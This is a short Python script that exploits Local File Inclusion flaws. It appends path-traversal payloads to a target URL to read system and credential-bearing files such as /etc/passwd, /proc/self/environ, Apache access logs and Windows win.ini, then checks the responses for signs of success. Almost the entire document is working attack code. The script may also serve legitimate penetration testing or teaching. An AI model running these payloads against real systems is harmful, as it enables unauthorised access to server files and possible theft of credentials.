import requests

# Common files to attempt inclusion for LFI (Local File Inclusion) exploit
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",   # Unix system file
    "../../../../../../proc/self/environ",  # Access environment variables (may expose credentials)
    "../../../../../../var/log/apache2/access.log",  # Apache access logs
    "../../../../../../windows/system32/drivers/etc/hosts",  # Windows hosts file
    "../../../../../../windows/win.ini"  # Windows system file
]

def exploit_file_inclusion(url):
    """
    Attempts to exploit a file inclusion vulnerability by trying to include
    common files on both Linux and Windows systems.
    
    Parameters:
        url (str): The URL of the vulnerable parameter.
        
    Returns:
        str: A message indicating the result of the exploitation.
    """
    for payload in LFI_PAYLOADS:
        try:
            exploit_url = f"{url}{payload}"
            response = requests.get(exploit_url)
            
            if response.status_code == 200 and "root:" in response.text:
                return f"Exploitation successful: {exploit_url} (Found /etc/passwd)"
            
            if response.status_code == 200 and "[extensions]" in response.text:
                return f"Exploitation successful: {exploit_url} (Found Windows win.ini)"
            
            if response.status_code == 200:
                # Check for other common LFI success indicators
                if "root" in response.text or "apache" in response.text or "localhost" in response.text:
                    return f"Exploitation successful: {exploit_url} (Possible file inclusion detected)"
        
        except Exception as e:
            return f"Error exploiting {url} with payload {payload}: {str(e)}"
    
    return "Exploitation failed. No file inclusion vulnerability detected."

